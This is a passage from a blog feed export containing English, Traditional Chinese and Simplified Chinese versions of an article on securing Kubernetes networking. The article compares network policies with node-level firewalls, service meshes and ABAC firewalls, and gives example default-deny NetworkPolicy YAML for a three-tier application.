securing Kubernetes networking: Traditional Firewalls: The Node-Level Trap You could use traditional network firewalls or cloud security groups to control traffic between Kubernetes nodes. But this approach has a fatal flaw that many enterprises discover too late. The problem: Traditional firewalls operate at the node level, not the pod level. Here’s why that’s dangerous: Imagine you have a Kubernetes node running three pods: Pod A: Frontend application (needs internet access for CDN) Pod B: Backend API (should never access internet) Pod C: Database (absolutely must not access internet) With a traditional firewall, you configure the node’s security group to allow outbound internet access because Pod A needs it. But here’s the catch: all three pods now have internet access. The firewall can’t distinguish between pods—it only sees the node’s IP address. This means: Your database pod can exfiltrate data to external servers Your backend API can be used as a proxy for outbound attacks A compromised pod can download malware or communicate with command-and-control servers 🔓 The Node-Level Security GapIf a firewall rule allows a node to access the internet (even for just one pod), every pod on that node inherits that access. You cannot enforce pod-specific egress policies with traditional firewalls. This is why node-level security is insufficient for Kubernetes. graph TB subgraph \"Traditional Firewall (Node-Level)\" FW1[\"Firewall Rule: Allow Internet\"] Node1[\"Kubernetes Node\"] FW1 -.->|\"Applies to entire node\"| Node1 subgraph Node1 PodA1[\"Pod A(needs internet)\"] PodB1[\"Pod B(shouldn't access internet)\"] PodC1[\"Pod C - Database(must not access internet)\"] end PodA1 -->|\"✓ Allowed\"| Internet1[\"Internet\"] PodB1 -->|\"✓ Allowed (PROBLEM!)\"| Internet1 PodC1 -->|\"✓ Allowed (DANGER!)\"| Internet1 end subgraph \"Network Policy (Pod-Level)\" Node2[\"Kubernetes Node\"] subgraph Node2 PodA2[\"Pod A(needs internet)\"] PodB2[\"Pod B(shouldn't access internet)\"] PodC2[\"Pod C - Database(must not access internet)\"] end NP1[\"Network Policy:Allow Pod A only\"] NP1 -.->|\"Applies to specific pod\"| PodA2 PodA2 -->|\"✓ Allowed\"| Internet2[\"Internet\"] PodB2 -.->|\"✗ Blocked\"| Internet2 PodC2 -.->|\"✗ Blocked\"| Internet2 end style PodB1 fill:#ffcccc style PodC1 fill:#ff9999 style PodB2 fill:#ccffcc style PodC2 fill:#ccffcc style FW1 fill:#ffeecc style NP1 fill:#ccffee Other limitations: IP-based, not pod-based: Pods are ephemeral with dynamic IPs. Firewall rules based on IP addresses become unmanageable as pods are created and destroyed. No Kubernetes awareness: Firewalls don’t understand namespaces, labels, or pod selectors. You lose the declarative, Kubernetes-native approach. Coarse-grained control: You can only control traffic at the node level, not the workload level where your actual security boundaries exist. Attribute-Based Access Control (ABAC) Firewalls Some next-generation firewalls support attribute-based policies, where rules are defined using metadata attributes rather than IP addresses. This is closer to Kubernetes Network Policy in philosophy: Metadata-driven: Rules based on application identity, user context, or workload attributes Dynamic: Policies adapt as workloads change without manual IP updates Centralized: Single policy engine for the entire infrastructure However, ABAC firewalls are typically external to Kubernetes, requiring integration and often significant cost. They’re powerful for hybrid environments (Kubernetes + VMs + cloud services) but add complexity. Service Mesh (Istio, Linkerd, Consul) Service meshes provide Layer 7 (application-level) traffic management and security: Mutual TLS: Automatic encryption and authentication between services Fine-grained policies: Control based on HTTP methods, headers, paths Observability: Detailed traffic metrics and tracing Advanced routing: Canary deployments, traffic splitting, retries Service meshes are incredibly powerful but come with trade-offs: Complexity: Significant learning curve and operational overhead. You’re adding sidecars to every pod, managing control planes, and debugging a new layer of infrastructure. Performance overhead: Sidecar proxies add latency (typically 1-5ms per hop) and resource consumption. Cost: More resources, more complexity, more operational burden. 💡 When to Use WhatNetwork Policies: Start here. They're built into Kubernetes, simple to implement, and cover 80% of enterprise security needs. Zero additional infrastructure required. Service Mesh: Add when you need Layer 7 features like mutual TLS, advanced routing, or detailed observability. Best for microservices architectures with complex service-to-service communication. ABAC Firewalls: Consider for hybrid environments where you need consistent policy across Kubernetes, VMs, and cloud services. Typically an enterprise-wide decision, not just for Kubernetes. Comparison: Network Policy vs Service Mesh vs ABAC Firewalls Feature Network Policy Service Mesh ABAC Firewall Layer Layer 3/4 (IP/Port) Layer 7 (HTTP/gRPC) Layer 3-7 Complexity Low High Medium Performance Impact Minimal 1-5ms latency Varies Cost Free (built-in) Resource overhead License costs Encryption No (needs separate solution) Mutual TLS included Depends on product Observability Basic (CNI-dependent) Excellent Good Kubernetes-Native Yes Yes No Learning Curve Gentle Steep Medium Best For Basic segmentation Microservices security Hybrid environments Real-World Implementation Let’s walk through a practical example: securing a three-tier application. Architecture: Frontend pods (public-facing) Backend API pods (internal) Database pods (sensitive data) Security requirements: Frontend can only talk to backend API Backend API can only talk to database Database accepts connections only from backend No pod can access the internet except frontend (for CDN assets) Implementation: # Deny all traffic by default apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: default-deny-all namespace: production spec: podSelector: &#123;&#125; policyTypes: - Ingress - Egress --- # Allow frontend to receive external traffic apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: frontend-policy namespace: production spec: podSelector: matchLabels: tier: frontend policyTypes: - Ingress - Egress ingress: - from: - namespaceSelector: &#123;&#125; ports: - protocol: TCP port: 80 egress: - to: - podSelector: matchLabels: tier: backend ports: - protocol: TCP port: 8080 - to: - namespaceSelector: &#123;&#125; podSelector: &#123;&#125; ports: - protocol: TCP port: 443 # Allow HTTPS for CDN --- # Allow backend to talk to database only apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: backend-policy namespace: production spec: podSelector: matchLabels: tier: backend policyTypes: - Ingress - Egress ingress: - from: - podSelector: matchLabels: tier: frontend ports: - protocol: TCP port: 8080 egress: - to: - podSelector: matchLabels: tier: database ports: - protocol: TCP port: 5432 - to: - namespaceSelector: matchLabels: name: kube-system podSelector: matchLabels: k8s-app: kube-dns ports: - protocol: UDP port: 53 # Allow DNS --- # Database accepts connections only from backend apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: database-policy namespace: production spec: podSelector: matchLabels: tier: database policyTypes: - Ingress ingress: - from: - podSelector: matchLabels: tier: backend ports: - protocol: TCP port: 5432 This setup creates clear boundaries. Even if an attacker compromises the frontend, they can’t directly access the database. They’d need to compromise both the frontend and backend to reach sensitive data—significantly raising the bar. ⚠️ Don't Forget DNSA common mistake is forgetting to allow DNS traffic. Pods need to resolve service names to IP addresses. Always include egress rules for kube-dns or CoreDNS, typically on UDP port 53. Getting Started Implementing network policies doesn’t have to be all-or-nothing. Here’s a pragmatic approach: 1. Verify CNI support: Not all Container Network Interface (CNI) plugins support network policies. Calico, Cilium, and Weave Net do. AWS VPC CNI and Azure CNI require additional configuration. Check your CNI documentation. 2. Start with monitoring: Before enforcing policies, deploy them in audit mode (if your CNI supports it) or use tools like Cilium Hubble to visualize existing traffic patterns. 3. Begin with deny-all: Create a default deny-all policy in a non-critical namespace. This forces you to explicitly allow necessary traffic, revealing your actual communication patterns. 4. Whitelist incrementally: Add allow rules one at a time, testing after each change. Start with obvious flows (frontend → backend) and work toward edge cases. 5. Automate testing: Use tools like netassert to write tests for your network policies. This prevents regressions when policies change. 6. Document and version control: Store policies in Git alongside your application manifests. Document why each rule exists. Future you (or your teammates) will thank you. 🛠️ Tools to Help Cilium Editor: Visual network policy editor Network Policy Viewer: Visualize policies as graphs Inspektor Gadget: Debug network traffic in real-time Calico Enterprise: Advanced policy management (commercial) The Bottom Line Kubernetes Network Policy is not optional for enterprises. It’s the foundation of cluster security, the first line of defense against lateral movement, and a compliance requirement for regulated industries. Yes, there are alternatives—service meshes offer more features, ABAC firewalls provide broader coverage—but network policies are built into Kubernetes, require no additional infrastructure, and solve the most critical problem: preventing unrestricted pod-to-pod communication. Start simple. Deploy a default-deny policy. Whitelist necessary traffic. Test thoroughly. Your security team, compliance auditors, and future incident responders will thank you. In Kubernetes, the default is trust. For enterprises, the standard must be zero trust. Network policies are how you get there.","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"Kubernetes","slug":"Kubernetes","permalink":"https://neo01.com/tags/Kubernetes/"},{"name":"Network Policy","slug":"Network-Policy","permalink":"https://neo01.com/tags/Network-Policy/"},{"name":"Zero Trust","slug":"Zero-Trust","permalink":"https://neo01.com/tags/Zero-Trust/"}],"lang":"en"},{"title":"Kubernetes 網路政策 - 為何零信任對企業至關重要","slug":"2022/10/Kubernetes-Network-Policy-Why-Zero-Trust-Matters-In-Enterprise-zh-TW","date":"un66fin66","updated":"un55fin55","comments":true,"path":"/zh-TW/2022/10/Kubernetes-Network-Policy-Why-Zero-Trust-Matters-In-Enterprise/","permalink":"https://neo01.com/zh-TW/2022/10/Kubernetes-Network-Policy-Why-Zero-Trust-Matters-In-Enterprise/","excerpt":"在 Kubernetes 中，預設情況下每個 Pod 都可以與其他 Pod 通訊。對企業而言，這不是安全性——這是等待發生的資料外洩。了解為何網路政策是您的第一道防線。","text":"在 Kubernetes 的世界中，有一個許多企業忽視的危險預設設定：每個 Pod 都可以與其他 Pod 通訊，跨越所有命名空間，沒有任何限制。這就像建造一棟辦公室，每扇門都沒上鎖，每個檔案櫃都是開放的，每位員工都可以進入每個房間。方便嗎？是的。安全嗎？絕對不是。 對於處理敏感資料、法規遵循或多租戶環境的企業來說，這種扁平網路模型是一顆定時炸彈。一個被入侵的 Pod 可以成為橫向移動攻擊整個叢集的跳板。這就是為什麼 Kubernetes 網路政策不僅重要，而且是必不可少的。 扁平網路問題 Kubernetes 的設計理念是簡單性。預設情況下，網路模型是扁平的——任何 Pod 都可以使用 IP 位址連接到任何其他 Pod。這使得開發變得容易，消除了網路複雜性，但也造成了巨大的安全漏洞。 考慮一個典型的企業應用程式： 前端 Pod 處理使用者請求 後端 API Pod 處理業務邏輯 資料庫 Pod 儲存敏感的客戶資料 管理 Pod 用於叢集管理 第三方整合 Pod 連接到外部服務 在預設的 Kubernetes 設定中，被入侵的前端 Pod 可以直接存取您的資料庫 Pod。被利用的第三方整合可以連接到您的管理工具。沒有障礙，沒有檢查點，沒有隔離。 🚨 資料外洩情境攻擊者利用您面向公眾的 Web 應用程式中的漏洞。他們獲得了前端 Pod 的 shell 存取權限。如果沒有網路政策，他們現在可以掃描整個叢集，發現資料庫 Pod，並竊取客戶資料——這一切都是因為沒有任何東西阻止他們建立這些連線。 這不是理論上的。2020 年 Tesla Kubernetes 資料外洩就是因為暴露的 Kubernetes 儀表板導致被入侵的 Pod 可以存取儲存在叢集其他地方的 AWS 憑證。網路隔離本可以限制爆炸半徑。 網路政策登場：Kubernetes 的零信任 Kubernetes 網路政策是一個規範，定義了 Pod 如何相互通訊以及如何與外部端點通訊。它是您叢集的防火牆，但不是使用 IP 位址和連接埠，而是根據 Pod 標籤、命名空間和 CIDR 區塊定義規則。 核心原則很簡單：預設拒絕，明確允許。這就是零信任網路——在證明必要之前，什麼都不信任。 基本的網路政策如下所示： apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: backend-policy namespace: production spec: podSelector: matchLabels: app: backend policyTypes: - Ingress - Egress ingress: - from: - podSelector: matchLabels: app: frontend ports: - protocol: TCP port: 8080 egress: - to: - podSelector: matchLabels: app: database ports: - protocol: TCP port: 5432 這個政策說：「後端 Pod 只能在連接埠 8080 上接收來自前端 Pod 的流量，並且只能在連接埠 5432 上向資料庫 Pod 發送流量。」其他一切都被阻擋。 ✅ 深度防禦網路政策不能取代應用程式層級的安全性、身份驗證或加密。它們是深度防禦策略中的一層。即使攻擊者入侵了一個 Pod，網路政策也會限制他們可以連接的範圍。 為何企業不能忽視這一點 對於企業來說，網路政策不是可選的——它們是合規性和安全性的必需品： 法規遵循：PCI-DSS、HIPAA 和 SOC 2 等標準要求網路隔離。您必須證明敏感資料與較不受信任的元件隔離。網路政策提供可稽核的、宣告式的隔離證明。 多租戶：如果您在同一個叢集上執行多個團隊或客戶，網路政策可以防止一個租戶存取另一個租戶的資源。沒有它們，命名空間隔離純粹是邏輯上的，而不是強制執行的。 爆炸半徑限制：當（不是如果）發生安全事件時，網路政策可以控制損害。開發命名空間中被入侵的 Pod 無法連接到生產環境。被攻破的前端無法直接存取資料庫。 稽核和可見性：網路政策是宣告式的並且受版本控制。您可以稽核誰在何時更改了什麼以及為什麼。將此與埋藏在網路設備中的傳統防火牆規則進行比較。 成本效益：無需為每個安全區域部署單獨的叢集（昂貴且操作複雜），您可以使用網路政策在單個叢集內建立安全邊界。 📊 合規要求PCI-DSS 要求 1.2.1 明確規定限制入站和出站流量，僅限於持卡人資料環境所需的流量。網路政策是滿足此要求的 Kubernetes 原生方式。 替代方案：屬性型防火牆與服務網格 網路政策並不是唯一的選擇。企業還有其他選項來保護 Kubernetes 網路： 傳統防火牆：節點層級陷阱 您可以使用傳統網路防火牆或雲端安全群組來控制 Kubernetes 節點之間的流量。但這種方法有一個致命缺陷，許多企業發現得太晚了。 問題所在：傳統防火牆在節點層級運作，而不是在 Pod 層級。這就是為什麼這很危險： 想像您有一個 Kubernetes 節點執行三個 Pod： Pod A：前端應用程式（需要網際網路存取 CDN） Pod B：後端 API（永遠不應該存取網際網路） Pod C：資料庫（絕對不能存取網際網路） 使用傳統防火牆，您配置節點的安全群組以允許出站網際網路存取，因為 Pod A 需要它。但問題來了：所有三個 Pod 現在都有網際網路存取權限。防火牆無法區分 Pod——它只看到節點的 IP 位址。 這意味著： 您的資料庫 Pod 可以將資料外洩到外部伺服器 您的後端 API 可以被用作出站攻擊的代理 被入侵的 Pod 可以下載惡意軟體或與命令控制伺服器通訊 🔓 節點層級安全漏洞如果防火牆規則允許節點存取網際網路（即使只是為了一個 Pod），該節點上的每個 Pod 都會繼承該存取權限。您無法使用傳統防火牆強制執行 Pod 特定的出站政策。這就是為什麼節點層級安全性對 Kubernetes 來說是不夠的。 graph TB subgraph \"傳統防火牆（節點層級）\" FW1[\"防火牆規則：允許網際網路\"] Node1[\"Kubernetes 節點\"] FW1 -.->|\"套用到整個節點\"| Node1 subgraph Node1 PodA1[\"Pod A（需要網際網路）\"] PodB1[\"Pod B（不應存取網際網路）\"] PodC1[\"Pod C - 資料庫（絕不能存取網際網路）\"] end PodA1 -->|\"✓ 允許\"| Internet1[\"網際網路\"] PodB1 -->|\"✓ 允許（問題！）\"| Internet1 PodC1 -->|\"✓ 允許（危險！）\"| Internet1 end subgraph \"網路政策（Pod 層級）\" Node2[\"Kubernetes 節點\"] subgraph Node2 PodA2[\"Pod A（需要網際網路）\"] PodB2[\"Pod B（不應存取網際網路）\"] PodC2[\"Pod C - 資料庫（絕不能存取網際網路）\"] end NP1[\"網路政策：僅允許 Pod A\"] NP1 -.->|\"套用到特定 Pod\"| PodA2 PodA2 -->|\"✓ 允許\"| Internet2[\"網際網路\"] PodB2 -.->|\"✗ 阻擋\"| Internet2 PodC2 -.->|\"✗ 阻擋\"| Internet2 end style PodB1 fill:#ffcccc style PodC1 fill:#ff9999 style PodB2 fill:#ccffcc style PodC2 fill:#ccffcc style FW1 fill:#ffeecc style NP1 fill:#ccffee 其他限制： 基於 IP，而非基於 Pod：Pod 是短暫的，具有動態 IP。基於 IP 位址的防火牆規則在 Pod 建立和銷毀時變得無法管理。 沒有 Kubernetes 感知能力：防火牆不理解命名空間、標籤或 Pod 選擇器。您失去了宣告式的 Kubernetes 原生方法。 粗粒度控制：您只能在節點層級控制流量，而不是在實際安全邊界所在的工作負載層級。 屬性型存取控制（ABAC）防火牆 一些新一代防火牆支援屬性型政策，其中規則使用中繼資料屬性而不是 IP 位址定義。這在理念上更接近 Kubernetes 網路政策： 中繼資料驅動：基於應用程式身份、使用者上下文或工作負載屬性的規則 動態：政策隨著工作負載變化而調整，無需手動更新 IP 集中式：整個基礎設施的單一政策引擎 然而，ABAC 防火牆通常是 Kubernetes 外部的，需要整合且通常成本高昂。它們對於混合環境（Kubernetes + VM + 雲端服務）很強大，但增加了複雜性。 服務網格（Istio、Linkerd、Consul） 服務網格提供第 7 層（應用程式層級）流量管理和安全性： 雙向 TLS：服務之間的自動加密和身份驗證 細粒度政策：基於 HTTP 方法、標頭、路徑的控制 可觀察性：詳細的流量指標和追蹤 進階路由：金絲雀部署、流量分割、重試 服務網格非常強大，但也有權衡： 複雜性：顯著的學習曲線和操作開銷。您要為每個 Pod 添加 sidecar，管理控制平面，並除錯新的基礎設施層。 效能開銷：Sidecar 代理增加延遲（通常每跳 1-5 毫秒）和資源消耗。 成本：更多資源、更多複雜性、更多操作負擔。 💡 何時使用什麼網路政策：從這裡開始。它們內建於 Kubernetes，易於實作，涵蓋 80% 的企業安全需求。無需額外基礎設施。 服務網格：當您需要第 7 層功能（如雙向 TLS、進階路由或詳細可觀察性）時添加。最適合具有複雜服務間通訊的微服務架構。 ABAC 防火牆：考慮用於混合環境，您需要跨 Kubernetes、VM 和雲端服務的一致政策。通常是企業級決策，而不僅僅是針對 Kubernetes。 比較：網路政策 vs 服務網格 vs ABAC 防火牆 功能 網路政策 服務網格 ABAC 防火牆 層級 第 3/4 層（IP/連接埠） 第 7 層（HTTP/gRPC） 第 3-7 層 複雜性 低 高 中 效能影響 最小 1-5 毫秒延遲 不一定 成本 免費（內建） 資源開銷 授權成本 加密 否（需要單獨解決方案） 包含雙向 TLS 取決於產品 可觀察性 基本（取決於 CNI） 優秀 良好 Kubernetes 原生 是 是 否 學習曲線 平緩 陡峭 中等 最適合 基本隔離 微服務安全 混合環境 實際實作 讓我們透過一個實際範例：保護三層應用程式。 架構： 前端 Pod（面向公眾） 後端 API Pod（內部） 資料庫 Pod（敏感資料） 安全要求： 前端只能與後端 API 通訊 後端 API 只能與資料庫通訊 資料庫僅接受來自後端的連線 除了前端（用於 CDN 資產）外，沒有 Pod 可以存取網際網路 實作： # 預設拒絕所有流量 apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: default-deny-all namespace: production spec: podSelector: &#123;&#125; policyTypes: - Ingress - Egress --- # 允許前端接收外部流量 apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: frontend-policy namespace: production spec: podSelector: matchLabels: tier: frontend policyTypes: - Ingress - Egress ingress: - from: - namespaceSelector: &#123;&#125; ports: - protocol: TCP port: 80 egress: - to: - podSelector: matchLabels: tier: backend ports: - protocol: TCP port: 8080 - to: - namespaceSelector: &#123;&#125; podSelector: &#123;&#125; ports: - protocol: TCP port: 443 # 允許 HTTPS 用於 CDN --- # 允許後端僅與資料庫通訊 apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: backend-policy namespace: production spec: podSelector: matchLabels: tier: backend policyTypes: - Ingress - Egress ingress: - from: - podSelector: matchLabels: tier: frontend ports: - protocol: TCP port: 8080 egress: - to: - podSelector: matchLabels: tier: database ports: - protocol: TCP port: 5432 - to: - namespaceSelector: matchLabels: name: kube-system podSelector: matchLabels: k8s-app: kube-dns ports: - protocol: UDP port: 53 # 允許 DNS --- # 資料庫僅接受來自後端的連線 apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: database-policy namespace: production spec: podSelector: matchLabels: tier: database policyTypes: - Ingress ingress: - from: - podSelector: matchLabels: tier: backend ports: - protocol: TCP port: 5432 這種設定建立了清晰的邊界。即使攻擊者入侵了前端，他們也無法直接存取資料庫。他們需要同時入侵前端和後端才能接觸到敏感資料——顯著提高了門檻。 ⚠️ 別忘了 DNS一個常見的錯誤是忘記允許 DNS 流量。Pod 需要將服務名稱解析為 IP 位址。始終包含 kube-dns 或 CoreDNS 的出站規則，通常在 UDP 連接埠 53 上。 入門指南 實作網路政策不必是全有或全無。以下是務實的方法： 1. 驗證 CNI 支援：並非所有容器網路介面（CNI）外掛都支援網路政策。Calico、Cilium 和 Weave Net 支援。AWS VPC CNI 和 Azure CNI 需要額外配置。檢查您的 CNI 文件。 2. 從監控開始：在強制執行政策之前，以稽核模式部署它們（如果您的 CNI 支援），或使用 Cilium Hubble 等工具視覺化現有流量模式。 3. 從全部拒絕開始：在非關鍵命名空間中建立預設的全部拒絕政策。這會強制您明確允許必要的流量，揭示您的實際通訊模式。 4. 逐步加入白名單：一次添加一個允許規則，每次更改後進行測試。從明顯的流程（前端 → 後端）開始，然後處理邊緣情況。 5. 自動化測試：使用 netassert 等工具為您的網路政策編寫測試。這可以防止政策更改時的回歸。 6. 文件化和版本控制：將政策與應用程式清單一起儲存在 Git 中。記錄每個規則存在的原因。未來的您（或您的團隊成員）會感謝您。 🛠️ 有用的工具 Cilium Editor：視覺化網路政策編輯器 Network Policy Viewer：將政策視覺化為圖形 Inspektor Gadget：即時除錯網路流量 Calico Enterprise：進階政策管理（商業版） 結論 Kubernetes 網路政策對企業來說不是可選的。它是叢集安全的基礎，是防止橫向移動的第一道防線，也是受監管行業的合規要求。 是的，有替代方案——服務網格提供更多功能，ABAC 防火牆提供更廣泛的覆蓋範圍——但網路政策內建於 Kubernetes，不需要額外的基礎設施，並解決了最關鍵的問題：防止不受限制的 Pod 間通訊。 從簡單開始。部署預設拒絕政策。將必要的流量加入白名單。徹底測試。您的安全團隊、合規稽核員和未來的事件回應人員會感謝您。 在 Kubernetes 中，預設是信任。對於企業來說，標準必須是零信任。網路政策就是您實現這一目標的方式。","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"Kubernetes","slug":"Kubernetes","permalink":"https://neo01.com/tags/Kubernetes/"},{"name":"Network Policy","slug":"Network-Policy","permalink":"https://neo01.com/tags/Network-Policy/"},{"name":"Zero Trust","slug":"Zero-Trust","permalink":"https://neo01.com/tags/Zero-Trust/"}],"lang":"zh-TW"},{"title":"Kubernetes 网络策略 - 为何零信任对企业至关重要","slug":"2022/10/Kubernetes-Network-Policy-Why-Zero-Trust-Matters-In-Enterprise-zh-CN","date":"un66fin66","updated":"un55fin55","comments":true,"path":"/zh-CN/2022/10/Kubernetes-Network-Policy-Why-Zero-Trust-Matters-In-Enterprise/","permalink":"https://neo01.com/zh-CN/2022/10/Kubernetes-Network-Policy-Why-Zero-Trust-Matters-In-Enterprise/","excerpt":"在 Kubernetes 中，默认情况下每个 Pod 都可以与其他 Pod 通信。对企业而言，这不是安全性——这是等待发生的数据泄露。了解为何网络策略是您的第一道防线。","text":"在 Kubernetes 的世界中，有一个许多企业忽视的危险默认设置：每个 Pod 都可以与其他 Pod 通信，跨越所有命名空间，没有任何限制。这就像建造一栋办公室，每扇门都没上锁，每个文件柜都是开放的，每位员工都可以进入每个房间。方便吗？是的。安全吗？绝对不是。 对于处理敏感数据、法规遵从或多租户环境的企业来说，这种扁平网络模型是一颗定时炸弹。一个被入侵的 Pod 可以成为横向移动攻击整个集群的跳板。这就是为什么 Kubernetes 网络策略不仅重要，而且是必不可少的。 扁平网络问题 Kubernetes 的设计理念是简单性。默认情况下，网络模型是扁平的——任何 Pod 都可以使用 IP 地址连接到任何其他 Pod。这使得开发变得容易，消除了网络复杂性，但也造成了巨大的安全漏洞。 考虑一个典型的企业应用程序： 前端 Pod 处理用户请求 后端 API Pod 处理业务逻辑 数据库 Pod 存储敏感的客户数据 管理 Pod 用于集群管理 第三方集成 Pod 连接到外部服务 在默认的 Kubernetes 设置中，被入侵的前端 Pod 可以直接访问您的数据库 Pod。被利用的第三方集成可以连接到您的管理工具。没有障碍，没有检查点，没有隔离。 🚨 数据泄露情境攻击者利用您面向公众的 Web 应用程序中的漏洞。他们获得了前端 Pod 的 shell 访问权限。如果没有网络策略，他们现在可以扫描整个集群，发现数据库 Pod，并窃取客户数据——这一切都是因为没有任何东西阻止他们建立这些连接。 这不是理论上的。2020 年 Tesla Kubernetes 数据泄露就是因为暴露的 Kubernetes 仪表板导致被入侵的 Pod 可以访问存储在集群其他地方的 AWS 凭证。网络隔离本可以限制爆炸半径。 网络策略登场：Kubernetes 的零信任 Kubernetes 网络策略是一个规范，定义了 Pod 如何相互通信以及如何与外部端点通信。它是您集群的防火墙，但不是使用 IP 地址和端口，而是根据 Pod 标签、命名空间和 CIDR 块定义规则。 核心原则很简单：默认拒绝，明确允许。这就是零信任网络——在证明必要之前，什么都不信任。 基本的网络策略如下所示： apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: backend-policy namespace: production spec: podSelector: matchLabels: app: backend policyTypes: - Ingress - Egress ingress: - from: - podSelector: matchLabels: app: frontend ports: - protocol: TCP port: 8080 egress: - to: - podSelector: matchLabels: app: database ports: - protocol: TCP port: 5432 这个策略说：&quot;后端 Pod 只能在端口 8080 上接收来自前端 Pod 的流量，并且只能在端口 5432 上向数据库 Pod 发送流量。&quot;其他一切都被阻止。 ✅ 深度防御网络策略不能取代应用程序级别的安全性、身份验证或加密。它们是深度防御策略中的一层。即使攻击者入侵了一个 Pod，网络策略也会限制他们可以连接的范围。 为何企业不能忽视这一点 对于企业来说，网络策略不是可选的——它们是合规性和安全性的必需品： 法规遵从：PCI-DSS、HIPAA 和 SOC 2 等标准要求网络隔离。您必须证明敏感数据与较不受信任的组件隔离。网络策略提供可审计的、声明式的隔离证明。 多租户：如果您在同一个集群上运行多个团队或客户，网络策略可以防止一个租户访问另一个租户的资源。没有它们，命名空间隔离纯粹是逻辑上的，而不是强制执行的。 爆炸半径限制：当（不是如果）发生安全事件时，网络策略可以控制损害。开发命名空间中被入侵的 Pod 无法连接到生产环境。被攻破的前端无法直接访问数据库。 审计和可见性：网络策略是声明式的并且受版本控制。您可以审计谁在何时更改了什么以及为什么。将此与埋藏在网络设备中的传统防火墙规则进行比较。 成本效益：无需为每个安全区域部署单独的集群（昂贵且操作复杂），您可以使用网络策略在单个集群内建立安全边界。 📊 合规要求PCI-DSS 要求 1.2.1 明确规定限制入站和出站流量，仅限于持卡人数据环境所需的流量。网络策略是满足此要求的 Kubernetes 原生方式。 替代方案：属性型防火墙与服务网格 网络策略并不是唯一的选择。企业还有其他选项来保护 Kubernetes 网络： 传统防火墙：节点级陷阱 您可以使用传统网络防火墙或云安全组来控制 Kubernetes 节点之间的流量。但这种方法有一个致命缺陷，许多企业发现得太晚了。 问题所在：传统防火墙在节点级运作，而不是在 Pod 级。这就是为什么这很危险： 想象您有一个 Kubernetes 节点运行三个 Pod： Pod A：前端应用程序（需要互联网访问 CDN） Pod B：后端 API（永远不应该访问互联网） Pod C：数据库（绝对不能访问互联网） 使用传统防火墙，您配置节点的安全组以允许出站互联网访问，因为 Pod A 需要它。但问题来了：所有三个 Pod 现在都有互联网访问权限。防火墙无法区分 Pod——它只看到节点的 IP 地址。 这意味着： 您的数据库 Pod 可以将数据泄露到外部服务器 您的后端 API 可以被用作出站攻击的代理 被入侵的 Pod 可以下载恶意软件或与命令控制服务器通信 🔓 节点级安全漏洞如果防火墙规则允许节点访问互联网（即使只是为了一个 Pod），该节点上的每个 Pod 都会继承该访问权限。您无法使用传统防火墙强制执行 Pod 特定的出站策略。这就是为什么节点级安全性对 Kubernetes 来说是不够的。 graph TB subgraph \"传统防火墙（节点级）\" FW1[\"防火墙规则：允许互联网\"] Node1[\"Kubernetes 节点\"] FW1 -.->|\"应用到整个节点\"| Node1 subgraph Node1 PodA1[\"Pod A（需要互联网）\"] PodB1[\"Pod B（不应访问互联网）\"] PodC1[\"Pod C - 数据库（绝不能访问互联网）\"] end PodA1 -->|\"✓ 允许\"| Internet1[\"互联网\"] PodB1 -->|\"✓ 允许（问题！）\"| Internet1 PodC1 -->|\"✓ 允许（危险！）\"| Internet1 end subgraph \"网络策略（Pod 级）\" Node2[\"Kubernetes 节点\"] subgraph Node2 PodA2[\"Pod A（需要互联网）\"] PodB2[\"Pod B（不应访问互联网）\"] PodC2[\"Pod C - 数据库（绝不能访问互联网）\"] end NP1[\"网络策略：仅允许 Pod A\"] NP1 -.->|\"应用到特定 Pod\"| PodA2 PodA2 -->|\"✓ 允许\"| Internet2[\"互联网\"] PodB2 -.->|\"✗ 阻止\"| Internet2 PodC2 -.->|\"✗ 阻止\"| Internet2 end style PodB1 fill:#ffcccc style PodC1 fill:#ff9999 style PodB2 fill:#ccffcc style PodC2 fill:#ccffcc style FW1 fill:#ffeecc style NP1 fill:#ccffee 其他限制： 基于 IP，而非基于 Pod：Pod 是短暂的，具有动态 IP。基于 IP 地址的防火墙规则在 Pod 创建和销毁时变得无法管理。 没有 Kubernetes 感知能力：防火墙不理解命名空间、标签或 Pod 选择器。您失去了声明式的 Kubernetes 原生方法。 粗粒度控制：您只能在节点级控制流量，而不是在实际安全边界所在的工作负载级。 属性型访问控制（ABAC）防火墙 一些新一代防火墙支持属性型策略，其中规则使用元数据属性而不是 IP 地址定义。这在理念上更接近 Kubernetes 网络策略： 元数据驱动：基于应用程序身份、用户上下文或工作负载属性的规则 动态：策略随着工作负载变化而调整，无需手动更新 IP 集中式：整个基础设施的单一策略引擎 然而，ABAC 防火墙通常是 Kubernetes 外部的，需要集成且通常成本高昂。它们对于混合环境（Kubernetes + VM + 云服务）很强大，但增加了复杂性。 服务网格（Istio、Linkerd、Consul） 服务网格提供第 7 层（应用程序级）流量管理和安全性： 双向 TLS：服务之间的自动加密和身份验证 细粒度策略：基于 HTTP 方法、标头、路径的控制 可观察性：详细的流量指标和追踪 高级路由：金丝雀部署、流量分割、重试 服务网格非常强大，但也有权衡： 复杂性：显著的学习曲线和操作开销。您要为每个 Pod 添加 sidecar，管理控制平面，并调试新的基础设施层。 性能开销：Sidecar 代理增加延迟（通常每跳 1-5 毫秒）和资源消耗。 成本：更多资源、更多复杂性、更多操作负担。 💡 何时使用什么网络策略：从这里开始。它们内置于 Kubernetes，易于实现，涵盖 80% 的企业安全需求。无需额外基础设施。 服务网格：当您需要第 7 层功能（如双向 TLS、高级路由或详细可观察性）时添加。最适合具有复杂服务间通信的微服务架构。 ABAC 防火墙：考虑用于混合环境，您需要跨 Kubernetes、VM 和云服务的一致策略。通常是企业级决策，而不仅仅是针对 Kubernetes。 比较：网络策略 vs 服务网格 vs 